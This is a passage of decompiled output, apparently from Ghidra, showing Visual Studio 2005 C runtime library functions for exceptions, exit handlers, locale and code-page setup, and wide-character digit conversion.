    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0041075c_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0041075c_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0041075c_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0041075c_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2005 Release

void __cdecl _write_char(wchar_t param_1)

{
  wint_t wVar1;
  FILE *in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)&in_EAX->_flag & 0x40) == 0) || (in_EAX->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,in_EAX);
    if (wVar1 == 0xffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release

void __cdecl _write_multi_char(wchar_t param_1,int param_2)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_1);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2005 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  size_t sVar1;
  char *_Dst;
  
  *(undefined **)this = &DAT_0041c944;
  if (*param_1 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar1 = _strlen(*param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,*param_1);
    }
  }
  *(undefined4 *)(this + 8) = 1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  char *pcVar1;
  
  *(undefined **)this = &DAT_0041c944;
  pcVar1 = *param_1;
  *(undefined4 *)(this + 8) = 0;
  *(char **)(this + 4) = pcVar1;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2005 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  
  *(undefined **)this = &DAT_0041c944;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)(this + 8) = iVar1;
  pcVar3 = *(char **)(param_1 + 4);
  if (iVar1 == 0) {
    *(char **)(this + 4) = pcVar3;
  }
  else if (pcVar3 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar2 = _strlen(pcVar3);
    pcVar3 = (char *)_malloc(sVar2 + 1);
    *(char **)(this + 4) = pcVar3;
    if (pcVar3 != (char *)0x0) {
      _strcpy_s(pcVar3,sVar2 + 1,*(char **)(param_1 + 4));
    }
  }
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall exception::~exception(void)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release

void __thiscall exception::~exception(exception *this)

{
  *(undefined **)this = &DAT_0041c944;
  if (*(int *)(this + 8) != 0) {
    _free(*(void **)(this + 4));
  }
  return;
}



exception * __thiscall FUN_004114ff(void *this,byte param_1)

{
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    _free(this);
  }
  return (exception *)this;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Library: Visual Studio 2005 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined **)this = &DAT_0041c964;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Library: Visual Studio 2005 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    _free(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2005 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl __onexit_nolock(undefined4 param_1)

{
  uint uVar1;
  undefined4 *_Memory;
  undefined4 *puVar2;
  size_t sVar3;
  size_t sVar4;
  void *pvVar5;
  
  _Memory = (undefined4 *)__decode_pointer(DAT_004257f0);
  puVar2 = (undefined4 *)__decode_pointer(DAT_004257ec);
  if (_Memory <= puVar2) {
    uVar1 = ((int)puVar2 - (int)_Memory) + 4;
    if (3 < uVar1) {
      sVar3 = __msize(_Memory);
      if (sVar3 < uVar1) {
        sVar4 = 0x800;
        if (sVar3 < 0x800) {
          sVar4 = sVar3;
        }
        if ((sVar4 + sVar3 < sVar3) ||
           (pvVar5 = __realloc_crt(_Memory,sVar4 + sVar3), pvVar5 == (void *)0x0)) {
          if (sVar3 + 0x10 < sVar3) {
            return 0;
          }
          pvVar5 = __realloc_crt(_Memory,sVar3 + 0x10);
          if (pvVar5 == (void *)0x0) {
            return 0;
          }
        }
        puVar2 = (undefined4 *)((int)pvVar5 + ((int)puVar2 - (int)_Memory >> 2) * 4);
        DAT_004257f0 = __encode_pointer((int)pvVar5);
      }
      *puVar2 = param_1;
      DAT_004257ec = __encode_pointer((int)(puVar2 + 1));
      return param_1;
    }
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2005 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040f097();
  p_Var1 = (_onexit_t)__onexit_nolock(_Func);
  FUN_00411672();
  return p_Var1;
}



void FUN_00411672(void)

{
  FUN_0040f0a0();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Library: Visual Studio 2005 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Library: Visual Studio 2005 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041c968;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2005 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2005 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  iVar2 = 0x101;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  _memset(puVar1,0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  do {
    *puVar1 = puVar1[(int)&DAT_00422778 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_00422778 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2005 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [52];
  undefined local_4a0 [408];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_4a0;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_004118bf:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_004118bf;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_00411866;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_00411866:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_4a0);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2005 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00422c9c) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != DAT_00422ba0) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_00422778)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = DAT_00422ba0;
      lpAddend = DAT_00422ba0;
      InterlockedIncrement(&DAT_00422ba0->refcount);
    }
    FUN_0041197d();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0041197d(void)

{
  FUN_0040e37b(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2005 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_0042421c = 0;
  if (unaff_ESI == -2) {
    DAT_0042421c = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_0042421c = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_0042421c = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_0042421c = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2005 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  UINT CodePage;
  uint uVar4;
  BOOL BVar5;
  undefined2 *puVar6;
  byte *pbVar7;
  int extraout_ECX;
  undefined2 *puVar8;
  int iVar9;
  undefined4 extraout_EDX;
  BYTE *pBVar10;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  CodePage = getSystemCP((int)unaff_EDI);
  if (CodePage != 0) {
    local_20 = (byte *)0x0;
    uVar4 = 0;
LAB_00411a3c:
    if (*(UINT *)((int)&DAT_00422ba8 + uVar4) != CodePage) goto code_r0x00411a44;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar7 = &DAT_00422bb8 + (int)local_20 * 0x30;
    local_20 = pbVar7;
    do {
      for (; (*pbVar7 != 0 && (bVar3 = pbVar7[1], bVar3 != 0)); pbVar7 = pbVar7 + 2) {
        for (uVar4 = (uint)*pbVar7; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar4);
          *pbVar2 = *pbVar2 | (&DAT_00422ba4)[local_24];
          bVar3 = pbVar7[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar7 = local_20 + 8;
      local_20 = pbVar7;
    } while (local_24 < 4);
    *(UINT *)(param_2 + 4) = CodePage;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar9 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar9;
    puVar6 = (undefined2 *)(param_2 + 0x10);
    puVar8 = (undefined2 *)(&DAT_00422bac + extraout_ECX);
    iVar9 = 6;
    do {
      *puVar6 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar6 = puVar6 + 1;
      iVar9 = iVar9 + -1;
    } while (iVar9 != 0);
    goto LAB_00411b3f;
  }
LAB_00411a29:
  setSBCS(unaff_EDI);
LAB_00411b9c:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x00411a44:
  local_20 = (byte *)((int)local_20 + 1);
  uVar4 = uVar4 + 0x30;
  if (0xef < uVar4) goto code_r0x00411a51;
  goto LAB_00411a3c;
code_r0x00411a51:
  BVar5 = GetCPInfo(CodePage,&local_1c);
  if (BVar5 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(UINT *)(param_2 + 4) = CodePage;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar10 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar10;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar10[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar7 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar7 = *pbVar7 | 4;
          }
          pBVar1 = pBVar10 + 1;
          pBVar10 = pBVar10 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar7 = (byte *)(param_2 + 0x1e);
      iVar9 = 0xfe;
      do {
        *pbVar7 = *pbVar7 | 8;
        pbVar7 = pbVar7 + 1;
        iVar9 = iVar9 + -1;
      } while (iVar9 != 0);
      iVar9 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar9;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_00411b3f:
    setSBUpLow(unaff_EDI);
    goto LAB_00411b9c;
  }
  if (DAT_0042421c == 0) goto LAB_00411b9c;
  goto LAB_00411a29;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2005 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  void **ppvVar2;
  int iVar3;
  int **ppiVar4;
  
  if ((((*(undefined4 **)((int)param_1 + 0xbc) != (undefined4 *)0x0) &&
       (*(undefined4 **)((int)param_1 + 0xbc) != &DAT_00422f38)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppvVar2 = *(void ***)(void **)((int)param_1 + 0xd4);
  if ((ppvVar2 != (void **)&DAT_00422e78) && (ppvVar2[0x2d] == (void *)0x0)) {
    ___free_lc_time(ppvVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar4 = (int **)((int)param_1 + 0x50);
  iVar3 = 6;
  do {
    if (((ppiVar4[-2] != (int *)&DAT_00422ca0) && (piVar1 = *ppiVar4, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar4[-1] != (int *)0x0) && (piVar1 = ppiVar4[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar4 = ppiVar4 + 4;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  _free(param_1);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2005 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG **ppLVar1;
  int iVar2;
  
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar1 = (LONG **)(param_1 + 0x14);
  iVar2 = 6;
  do {
    if ((ppLVar1[-2] != (LONG *)&DAT_00422ca0) && (*ppLVar1 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar1);
    }
    if ((ppLVar1[-1] != (LONG *)0x0) && (ppLVar1[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar1[1]);
    }
    ppLVar1 = ppLVar1 + 4;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  InterlockedIncrement((LONG *)(param_1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2005 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG **ppLVar1;
  int iVar2;
  
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar1 = (LONG **)(param_1 + 0x14);
    iVar2 = 6;
    do {
      if ((ppLVar1[-2] != (LONG *)&DAT_00422ca0) && (*ppLVar1 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar1);
      }
      if ((ppLVar1[-1] != (LONG *)0x0) && (ppLVar1[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar1[1]);
      }
      ppLVar1 = ppLVar1 + 4;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    InterlockedDecrement((LONG *)(param_1[0x35] + 0xb4));
  }
  return param_1;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2005 Release

LONG * __updatetlocinfoEx_nolock(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      ___addlocaleref(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        ___removelocaleref(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_00422ca8)) {
          ___freetlocinfo(pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2005 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00422c9c) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    __updatetlocinfoEx_nolock();
    FUN_0041205d();
  }
  else {
    p_Var1 = __getptd();
    p_Var1 = (_ptiddata)p_Var1->ptlocinfo;
  }
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x20);
  }
  return (pthreadlocinfo)p_Var1;
}



void FUN_0041205d(void)

{
  FUN_0040e37b(0xc);
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2005 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  bool bVar2;
  
  if (0x2f < param_1) {
    if (param_1 < 0x3a) {
      return param_1 - 0x30;
    }
    iVar1 = 0xff10;
    if (param_1 < 0xff10) {
      iVar1 = 0x660;
      if (param_1 < 0x660) {
        return -1;
      }
      if (param_1 < 0x66a) goto LAB_004120a7;
      iVar1 = 0x6f0;
      if (param_1 < 0x6f0) {
        return -1;
      }
      if (param_1 < 0x6fa) goto LAB_004120a7;
      iVar1 = 0x966;
      if (param_1 < 0x966) {
        return -1;
      }
      if (param_1 < 0x970) goto LAB_004120a7;
      iVar1 = 0x9e6;
      if (param_1 < 0x9e6) {
        return -1;
      }
      if (param_1 < 0x9f0) goto LAB_004120a7;
      iVar1 = 0xa66;
      if (param_1 < 0xa66) {
        return -1;
      }
      if (param_1 < 0xa70) goto LAB_004120a7;
      iVar1 = 0xae6;
      if (param_1 < 0xae6) {
        return -1;
      }
      if (param_1 < 0xaf0) goto LAB_004120a7;
      iVar1 = 0xb66;
      if (param_1 < 0xb66) {
        return -1;
      }
      if (param_1 < 0xb70) goto LAB_004120a7;
      iVar1 = 0xc66;
      if (param_1 < 0xc66) {
        return -1;
      }
      if (param_1 < 0xc70) goto LAB_004120a7;
      iVar1 = 0xce6;
      if (param_1 < 0xce6) {
        return -1;
      }
      if (param_1 < 0xcf0) goto LAB_004120a7;
      iVar1 = 0xd66;
      if (param_1 < 0xd66) {
        return -1;
      }
      if (param_1 < 0xd70) goto LAB_004120a7;
      iVar1 = 0xe50;
      if (param_1 < 0xe50) {
        return -1;
      }
      if (param_1 < 0xe5a) goto LAB_004120a7;
      iVar1 = 0xed0;
      if (param_1 < 0xed0) {
        return -1;
      }
      if (param_1 < 0xeda) goto LAB_004120a7;
      iVar1 = 0xf20;
      if (param_1 < 0xf20) {
        return -1;
      }
      if (param_1 < 0xf2a) goto LAB_004120a7;
      iVar1 = 0x1040;
      if (param_1 < 0x1040) {
        return -1;
      }
      if (param_1 < 0x104a) goto LAB_004120a7;
      iVar1 = 0x17e0;
      if (param_1 < 0x17e0) {
        return -1;
      }
      if (param_1 < 0x17ea) goto LAB_004120a7;
      iVar1 = 0x1810;
      if (param_1 < 0x1810) {
        return -1;
      }
      bVar2 = param_1 < 0x181a;
    }
    else {
      bVar2 = param_1 < 0xff1a;
    }
    if (bVar2) {
LAB_004120a7:
      return (uint)param_1 - iVar1;
    }
  }
  return -1;
}



// Library Function - Single Match
//  __iswctype_l
// 
// Library: Visual Studio 2005 Release

int __cdecl __iswctype_l(wint_t _C,wctype_t _Type,_locale_t _Locale)

{
  int iVar1;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  if (_C == 0xffff) {
    local_8[0] = 0;
  }
  else if (_C < 0x100) {
    local_8[0] = *(ushort *)(DAT_00422e74 + (uint)_C * 2) & _Type;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    iVar1 = ___crtGetStringTypeW
                      (&local_18,1,(wchar_t *)&_C,1,local_8,(local_18.locinfo)->lc_codepage,
                       (int)(local_18.locinfo)->lc_category[0].wlocale);
    if (iVar1 == 0) {
      local_8[0] = 0;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return (uint)(local_8[0] & _Type);
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2005 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2005 Release

